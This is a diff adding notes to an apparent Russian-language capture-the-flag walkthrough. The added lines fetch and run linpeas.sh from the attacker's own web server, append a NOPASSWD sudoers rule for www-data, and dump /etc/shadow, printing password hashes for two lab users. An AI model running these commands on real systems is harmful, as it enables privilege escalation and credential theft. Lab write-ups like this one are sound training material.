@@ -55,3 +55,25 @@ put namefile
 <img width="695" height="668" alt="Снимок экрана 2026-04-27 в 21 45 21" src="https://github.com/user-attachments/assets/74dd248e-2827-4a02-b71e-fc3465b61a99" />
 в папке home есть два пользователя в wamp пусто а в merlin нет и там лежит 1й флаг 
 <img width="581" height="497" alt="Снимок экрана 2026-04-27 в 21 54 05" src="https://github.com/user-attachments/assets/a11adb3f-d560-4f9b-a6ab-52c06191af5c" />
+```
+sudo python3 -m http.server 80 
+wget http://ip/linpeas.sh
+chmod +x linpeas.sh
+./linpeas
+```
+intratack:
+
+```
+echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.bak
+sudo su -
+sudo: no tty present and no askpass program specified
+$ sudo -i
+sudo: no tty present and no askpass program specified
+```
+
+```
+www-data@ubuntu:/$ sudo cat /etc/shadow
+sudo cat /etc/shadow
+root:!:18134:0:99999:7::: - no pass
+merlin:$1$EWeeql.h$8mH.7rEhPRGsOb5ECtmIe1:18134:0:99999:7:::
+wampp:$6$f8LMirW0$43znQ5kMsELDO9BdUmhbGkUEnVH2OKXZjfEtsyUgbvL79KoJtgLkdbJpHw4OuDDIMtaXjGjkjaRKD```
